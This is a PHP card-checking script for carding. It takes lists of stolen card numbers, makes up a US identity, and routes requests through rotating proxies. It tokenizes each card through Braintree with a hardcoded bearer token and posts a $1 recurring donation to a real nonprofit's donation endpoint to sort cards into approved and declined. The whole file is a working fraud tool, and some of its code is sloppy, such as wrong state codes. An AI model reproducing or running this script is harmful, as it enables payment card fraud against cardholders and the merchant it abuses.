<?php 

//////////////////////[Raw Api for Braintree payment gateway #Reboot13]///////////////
require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/bangkok');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxy(){
    $proxy = file("proxies.txt");
    $myproxy = rand(0, sizeof($proxy)-1);
    $proxy = $proxy[$myproxy];
    return $proxy;

}
$proxy = rebootproxy();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, 'postcode":', ',');
$state = value($resposta, 'state":"', '"');
$email = value($resposta, 'email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, 'street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 


/*switch ($ano) {
  case '2019':
  $ano = '19';
    break;
  case '2020':
  $ano = '20';
    break;
  case '2021':
  $ano = '21';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
    case '2027':
    $ano = '27';
    break;
}*/

///////////////////////////////////////////////////=========[Luminati Details]

$username = 'username';
$password = 'password';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

///////////////////////////////////////////////////=========[Authorizing Cards]

$ch = curl_init();
//////////======= LUMINATI
//curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
//////////======= Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"e86ae750-a4ea-4450-953a-a8a9913a964e"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":true}}},"operationName":"TokenizeCreditCard"}');
//// Short codes $cc $mes $ano $cvv $firstname $lastname $street $zip $phone $state $email/////////////////////
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTMzNTEyMTEsImp0aSI6ImFjMDcxZGE3LWM5MzctNGJhMS04YTJiLTQ3YzYxZDAxYzY3ZCIsInN1YiI6InE0YnRxNHRieWtzbXZqdnMiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InE0YnRxNHRieWtzbXZqdnMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJvcHRpb25zIjp7fX0.4rHvIIjOre3arHKXaeo1lEwZwB1my8dyahRQy9QjV2vlNuMtw_-4LgqDiiMz-qe3J36v17GW47ivwkHCqToKIQ';
$headers[] = 'Accept-language: th,en-US;q=0.7,en;q=0.3';
$headers[] = 'Braintree-version: 2018-05-10';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://assets.braintreegateway.com';
$headers[] = 'Referer: https://assets.braintreegateway.com/web/3.62.1/html/hosted-fields-frame.min.html';
$headers[] = 'Sec-Fetch-Mode: cors';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
$token = trim(strip_tags(getStr($result,'"token":"','"')));

///////////////////////////////////////////////////=========[Charging Cards]

$ch = curl_init();
//////////======= LUMINATI
//curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
//////////======= Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
curl_setopt($ch, CURLOPT_URL, 'https://actions.sumofus.org/api/payment/braintree/pages/567/transaction');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=1&currency=USD&recurring=true&store_in_vault=true&user%5Bname%5D='.$firstname.'&user%5Bemail%5D='.$email.'&user%5Bpostal%5D='.$zip.'&user%5Bphone%5D='.$phone.'&user%5Bcountry%5D=US&payment_method_nonce='.$token.'&device_data%5Bdevice_session_id%5D=14e30e16773933ddfb261ec84cdc078e&device_data%5Bfraud_merchant_id%5D=&device_data%5Bcorrelation_id%5D=e80b7909831c3f39424210d8aec99d33&recaptcha_token=03AGdBq25U-6QRR_4wLCvSre2qqJ2Lj_T9z-gUfernlte5Tec0hWMnDoST36gE9x2FGM2P5Bxln4NCYsIwb66rJIO6KqmUcO8b50UUAfjj0NNy9T-Zo40OJwskOdNokow9T9IFsrzaPAlU3raM11Mmavj-0MXsSPv5WTGjbOKKjnOxhMEO_4OYTtdqyQSpAVQpyq8MSR9BwtWe3sx0F4oEri22Ny0oXg1_wiceaHx4EdegY99r9y7zkdTegTYzTHj39qNKYFX64qZ39DA6z54y0weU7X2z-woyeeVWzjuIajsra6ADNPxun4OLRViJf_ZQ78-tcO08uv2uWp8-tYdyhAOUdXDZnu-qwRQ5AeMPQ6qr9LCQHvsTwafYspiUgGMra223COCVESi0gb8gtUJeR6pJILsbcz4VnQ&recaptcha_action=donate%2F567');
//// Short codes $cc $mes $ano $cvv $firstname $lastname $street $zip $phone $state $email/////////////////////
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Authorization: ';
$headers[] = 'Host: actions.sumofus.org';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Origin: https://actions.sumofus.org';
$headers[] = 'Referer: https://actions.sumofus.org/a/donate';
$headers[] = 'Sec-Fetch-Mode: cors';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
$message = trim(strip_tags(getStr($result,'"cvv_result":{"code":"','"')));
$avs = trim(strip_tags(getStr($result,'"avs_result":{"code":"','"')));

///////////////////////////////////////////////////=========[Responses]

if(strpos($result, 'M')) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ⍋</i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>Authorized [CVV-$message/AVS-$avs]</i></font><br>";
} 
else {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ⍋</i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>Declined [CVV-$message/AVS-$avs]</i></font><br>";
} 

curl_close($ch);
ob_flush();
///////////////////////////////////Edited and modified by Reboot13////////////////////////

?>